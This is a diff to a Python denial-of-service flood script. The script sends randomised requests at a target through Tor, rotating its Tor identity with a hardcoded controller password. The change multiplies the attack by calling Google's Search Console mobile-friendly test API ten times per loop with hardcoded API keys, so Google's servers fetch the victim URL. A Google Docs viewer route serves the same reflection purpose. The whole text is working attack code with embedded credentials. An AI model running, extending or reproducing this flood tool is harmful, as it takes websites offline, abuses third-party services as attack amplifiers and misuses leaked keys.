@@ -23,7 +23,7 @@ def randomurl():
 def flood(target,domainname,attack,sock):
     headers = {
     "X-Requested-With": "XMLHttpRequest",
-    "Connection": "close",
+    "Connection": "keep-alive",
     "Pragma": "no-cache",
     "Cache-Control": "no-cache",
     "Accept-Encoding": "gzip, deflate, br",
@@ -31,15 +31,24 @@ def flood(target,domainname,attack,sock):
     }
     payload = str(random._urandom(random.randint(10, 150)))
     datapost= {
-    "url": target+'?'+payload,
+    "url": target+'/?'+payload,
     }
     s = requests.Session()
 	
     with Controller.from_port(port = 9051) as controller:
         controller.authenticate(password="taisaoem")
         controller.signal(Signal.NEWNYM)
-    key1='AIzaSyBHi888UMDA55d'
-    key2='SnonFKSNZtgm-8_6TQ7I'
+    key1='AIzaSy'
+    key2='BHi888UMDA55dSnonFKSNZtgm-8_6TQ7I'
+    key3='ArlvSOvTA3iDhq5ay-GKrfjeECUf-rd00'
+    key4='BNCglR37F0eBQfnmI7bW974JDthlQa2T4'
+    key5='DrKdv9g8ilkxDfAHW-G_Lz1rXnei9g1Qw'
+    key6='AiJwOhOGBC2igc7wowoT72ODA9qJ1OYis'
+    key7='Brpdc4c8oeRMEidAUMdeCpYYy_eu7P3pk'
+    key8='CY1In30SdsKU2s-ko9tqcTMW6cf9Knmpg'
+    key9='DY82nXT8v34WRPkav46R22mQqU3udDB4E'
+    key10='D2BsiZDtQLfpSLsB8Q7csQbltMEROGPgQ'
+    key11='A0a6Ql5g_CWzM22WdE-pT9K_Gj6oUSy54'
     
     #payload = randomurl()
     if sock =='http':
@@ -56,7 +65,16 @@ def flood(target,domainname,attack,sock):
             elif attack =='head':
                 r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
             elif attack =='googleapi':
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key2, data=datapost, headers=headers, timeout=20 ,verify=False)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key2, data=datapost, headers=headers, timeout=20)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key3, data=datapost, headers=headers, timeout=20)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key4, data=datapost, headers=headers, timeout=20)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key5, data=datapost, headers=headers, timeout=20)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key6, data=datapost, headers=headers, timeout=20)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key7, data=datapost, headers=headers, timeout=20)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key8, data=datapost, headers=headers, timeout=20)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key9, data=datapost, headers=headers, timeout=20)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key10, data=datapost, headers=headers, timeout=20)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key11, data=datapost, headers=headers, timeout=20)
             elif attack =='google':
                 r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=15)
             elif attack =='delete':
